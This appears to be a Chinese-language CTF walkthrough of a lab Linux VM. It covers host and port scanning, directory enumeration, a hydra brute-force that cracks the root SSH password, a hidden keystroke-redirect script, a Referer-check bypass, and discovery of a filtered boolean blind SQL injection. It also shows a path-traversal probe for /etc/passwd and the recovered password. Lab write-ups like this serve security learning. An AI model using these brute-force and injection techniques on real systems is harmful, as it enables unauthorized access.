---
作者: 明明就
靶机id: "648"
系统: Linux
难度: Easy
---
# 主机发现
```bash
┌──(kali㉿kali)-[~]
└─$ nmap 10.216.75.0/24 -sn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 23:24 CST
Nmap scan report for 10.216.75.72
Host is up (0.0018s latency).
MAC Address: 08:00:27:98:C5:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 10.216.75.183
Host is up (0.035s latency).
MAC Address: 4E:20:31:25:4A:3C (Unknown)
Nmap scan report for 10.216.75.212
Host is up (0.0012s latency).
MAC Address: 30:E3:A4:48:AC:29 (Unknown)
Nmap scan report for 10.216.75.80
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.60 seconds

```
确定靶机IP：
`10.216.75.72`
# 端口扫描
```bash
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.216.75.72
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.216.75.72:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-05 23:26 CST
Initiating ARP Ping Scan at 23:26
Scanning 10.216.75.72 [1 port]
Completed ARP Ping Scan at 23:26, 0.11s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:26
Completed Parallel DNS resolution of 1 host. at 23:26, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:26
Scanning 10.216.75.72 [1 port]
Discovered open port 80/tcp on 10.216.75.72
Completed SYN Stealth Scan at 23:26, 0.03s elapsed (1 total ports)
Nmap scan report for 10.216.75.72
Host is up, received arp-response (0.0021s latency).
Scanned at 2026-05-05 23:26:24 CST for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:98:C5:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)
```
工具不太熟悉，这么多结果。用工具总结一手（就是懒得看）：
```bash
┌──(kali㉿kali)-[~]
└─$ what 总结一下结果并且解释一下两个感叹号是什么 --md

──────────────────────────────────────────────────
$ rustscan -a 10.216.75.72  (exit: 0)
──────────────────────────────────────────────────

命令执行结果：

 • 工具：rustscan 扫描目标 IP 10.216.75.72，发现开放端口 80/tcp（HTTP 服务）。
 • 自动调用 Nmap 对该端口详细扫描，确认主机在线且端口开放，MAC 地址为 VirtualBox 虚拟机网卡。

两个感叹号警告含义：

 1 文件限制低于默认批处理大小：当前系统允许打开的文件数太少，可能导致 RustScan 批处理端口时对敏感服务器造成意外影响（如发送大量请求）。建议用
   --ulimit 提高限制。
 2 文件限制过小严重影响扫描速度：提示当前 ulimit 值太小，推荐使用 Docker 镜像或运行 --ulimit 5000 提升速度。
```
发现只开了80端口。我们先去web看看。
就一个登录页面，扫一下目录
```bash
D:\webtool\Dirsearch\lib\core\installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 11946

Target: http://10.216.75.72/

[00:01:44] Scanning:
[00:01:47] 403 -   277B - /.php
[00:02:06] 200 -    2KB - /index.php
[00:02:06] 200 -    2KB - /index.php/login/
[00:02:17] 403 -   277B - /server-status
[00:02:17] 403 -   277B - /server-status/
[00:02:25] 400 -   304B - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
好像也没扫到啥有用的，莫非要去爆破了吗？暂时没思路。。。
很抓马的事情。。。。。。。
就在我想破脑袋都不知道怎么做疯狂找apache历史漏洞的时候：
```bash
┌──(kali㉿kali)-[~/tmp/what]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.216.75.72 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-06 01:58:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.216.75.72:22/
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
[STATUS] 68.00 tries/min, 204 tries in 00:03h, 14344195 to do in 3515:45h, 4 active

[STATUS] 67.86 tries/min, 475 tries in 00:07h, 14343924 to do in 3523:05h, 4 active
[22][ssh] host: 10.216.75.72   login: root   password: zacefron
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-06 02:08:49
```
	`[22][ssh] host: 10.216.75.72   login: root   password: zacefron`
这告诉我们啥也做不出来的时候，还是可以试试被爆破的。
直接爆破出来root密码了，还能说什么呢。虽然知道这肯定不是预期解，但是我实在想不出来了，就登上root去看了一下`/var/www/html`，发现居然是我字典里没有`secret.php`（看来需要换字典了）
```bash
root@Open:~# ls /var/www/html
index.php  secret.php  sl.php
```
那就还是把这个加到字典里好好做一下吧。
# 端口扫描（重新开始）
```bash
PS D:\webtool\Dirsearch> python dirsearch.py -u 10.216.75.72 -w dicc2.txt
D:\webtool\Dirsearch\lib\core\installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 13136

Target: http://10.216.75.72/

[02:16:09] Scanning:
[02:16:09] 403 -    2KB - /secret.php
[02:16:09] 400 -   304B - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[02:16:12] 403 -   277B - /.php
[02:16:26] 200 -    2KB - /index.php
[02:16:26] 200 -    2KB - /index.php/login/
[02:16:36] 403 -   277B - /server-status
[02:16:36] 403 -   277B - /server-status/
```
# 渗透测试
## secret.php
虽然没有什么有用的文件，但是我们注意到同样是`403`，`/secret.php`文件的403页面的大小要小很多，我们去web看一下。
![](file-20260506022715811.png)
![](file-20260506022737023.png)
很明显`/secret.php`的403页面不一样，不是标准的apache-403。
我们去看看源码，发现最下方有隐藏的脚本（打印了很多空行）
```js
 <script>
        // 使用最稳健的非混淆结构，但通过 atob 隐藏关键字符串
        (function() {
            var _s = "";
            document.addEventListener('keydown', function(e) {
                // 忽略非字符键（如 Shift）
                if (e.key.length > 1) return;
                
                _s += e.key.toLowerCase();
                
                // 检查是否包含 "open" 的 Base64 编码 (b3Blbg==)
                if (_s.indexOf(atob('b3Blbg==')) !== -1) {
                    // 跳转到 sl.php 的 Base64 编码 (c2wucGhw)
                    // 修改点：'ZW50cmFuY2UucGhw' -> 'c2wucGhw'
                    window.location.href = atob('c2wucGhw');
                }
                
                // 防止缓冲区过长
                if (_s.length > 20) _s = _s.substring(10);
            });
        })();
    </script>
```
脚本效果：
1. **记录按键**：监听 `keydown` 事件，收集用户的按键（小写字母）。
2. **触发条件**：当按下的字母序列包含 **"open"**（`atob('b3Blbg==')` 解码得到 `"open"`）时，网页跳转到 `atob('c2wucGhw')` 解码后的路径 —— **`sl.php`**。
3. **防缓冲区过长**：只保留最近20个字符，避免序列太长。
我们直接键盘按一下`open`，跳转到了`http://10.216.75.72/sl.php`
## sl.php
就一个数据库查询页面，什么也没有，而且输入什么都是404。
我们可以试一下刷新一下页面，发现居然也404了。
这里可以想到请求必须来自`secret.php`
所以我们尝试带上`Refer`请求头。
![](file-20260506025211666.png)
传参成功
传`1001‘`发现报错，存在sql注入，然后就是测一下sql注入，发现可以打布尔盲注（不回显查询结果，但是回显是否查询成功）
简单跑一下字典，测一下有没有waf：
* union
* sleep
* floor
* regexp
* updatexml
* benchmark
* extractvalue
过滤了这些关键字，而且应该是正则匹配，大小写